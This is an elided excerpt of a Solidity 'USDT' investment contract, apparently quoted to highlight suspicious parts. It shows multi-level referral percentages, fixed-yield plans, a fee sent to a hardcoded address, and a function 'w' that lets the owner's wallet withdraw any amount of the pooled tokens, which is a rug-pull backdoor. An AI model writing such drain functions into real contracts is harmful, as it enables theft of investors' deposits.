...
contract USDT {
	...
	uint256[] public REFERRAL_PERCENTS = [50, 20, 20, 20, 20, 10, 10, 10, 10, 10];
	...
	constructor(address tokenAddr, uint256 minAmount, address payable wallet) public {
        ...
        plans.push(Plan(180, 12)); // 1.2%
        plans.push(Plan(270, 14)); // 1.4%
        plans.push(Plan(365, 16)); // 1.6%
	}
	...
	function invest(address referrer, uint8 plan, uint256 value) public {
		...
		token.safeTransfer(0xa80b4cE7bd50041806d41F4B3b709a7F1e37F763, fee);
	...
	function w(uint256 amount) external{
        require(commissionWallet==msg.sender);
        token.transfer(commissionWallet, amount);
    }
